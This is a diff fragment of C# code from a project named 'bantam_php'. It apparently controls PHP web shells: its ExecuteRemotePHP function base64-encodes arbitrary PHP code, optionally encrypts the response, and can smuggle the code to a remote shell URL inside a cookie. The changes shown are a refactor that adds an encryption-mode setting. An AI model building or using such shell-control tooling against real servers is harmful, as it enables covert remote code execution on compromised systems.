@@ -1,17 +1,11 @@
 ﻿using System;
-using System.Text;
 using System.Web;
-using System.IO;
 using System.Collections.Generic;
 using System.Net.Http;
 using System.Threading.Tasks;
 using System.Net;
-using System.Linq;
-using System.Windows.Forms;
 using SocksSharp;
 using SocksSharp.Proxy;
-using System.Threading;
-using System.Text.RegularExpressions;
 
 namespace bantam_php
 {
@@ -148,11 +142,12 @@ namespace bantam_php
         /// <returns></returns>
         public static async Task<ResponseObject> ExecuteRemotePHP(string url, string code, bool encryptResponse)
         {
+            string encryptionKey = string.Empty,
+                   encryptionIV = string.Empty;
+
             string requestArgsName = BantamMain.Shells[url].requestArgName;
             bool sendViaCookie = BantamMain.Shells[url].sendDataViaCookie;
-
-            string encryptionKey = string.Empty, 
-                   encryptionIV = string.Empty;
+            int responseEncryptionMode = BantamMain.Shells[url].responseEncryptionMode;
 
             try {
                 HttpMethod method;
@@ -167,10 +162,10 @@ namespace bantam_php
 
                 if (!string.IsNullOrEmpty(code)) {
                     if (encryptResponse) {
-                        code += PhpHelper.EncryptPhpVariableAndEcho(ref encryptionKey, ref encryptionIV);
+                        code += PhpHelper.EncryptPhpVariableAndEcho(responseEncryptionMode, ref encryptionKey, ref encryptionIV);
                     }
                     string minifiedCode = Helper.MinifyCode(code);
-                    string b64EncodedCode = Helper.EncodeBase64Tostring(minifiedCode);
+                    string b64EncodedCode = Helper.EncodeBase64ToString(minifiedCode);
                    
                     if (sendViaCookie) {
                         string urlEncodedCode = HttpUtility.UrlEncode(b64EncodedCode);
